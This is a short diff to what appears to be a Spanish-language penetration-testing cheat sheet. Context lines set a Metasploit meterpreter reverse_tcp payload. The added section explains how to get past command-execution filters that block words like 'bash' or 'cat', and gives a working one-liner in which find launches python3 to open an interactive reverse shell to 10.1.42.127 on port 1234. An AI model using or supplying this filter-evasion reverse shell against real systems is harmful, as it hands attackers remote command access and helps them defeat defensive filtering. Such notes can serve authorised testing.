@@ -67,3 +67,11 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST tu_ip
 set LPORT tu_puerto
 ```
+
+### Filtros command execution
+En ocasiones podemos ejecutar algunos comandos, pero no "bash", "cat" o similares que puedan ser interpretados como una amenaza. Algunas alternativas son:
+
+```bash
+find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.42.127",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;
+
+```
